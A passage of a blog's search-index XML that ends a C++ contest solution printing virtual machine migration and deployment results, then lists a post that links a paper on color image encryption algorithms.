class="string">&quot;)&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出迁移虚拟机信息</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(migration, 0)&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;部署虚拟机信息</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;deploy_server_list.size();i++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;deploy_server_list[<span class="number">0</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>An overview of encryption algorithms in color images</title>
    <url>/2021/03/18/An-overview-of-encryption-algorithms-in-color-images/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://linkinghub.elsevier.com/retrieve/pii/S016516841930218X">【论文地址】</a></p>
<h3 id="An-overview-of-encryption-algorithms-in-color-images"><a href="#An-overview-of-encryption-algorithms-in-color-images" class="headerlink" title="An overview of encryption algorithms in color images"></a>An overview of encryption algorithms in color images</h3>]]></content>
      <categories>
        <category>复杂网络与图像加密</category>
      </categories>
      <tags>
        <tag>图像加密</tag>
        <tag>论文</tag>
      </tags>
  </entry>
</search>
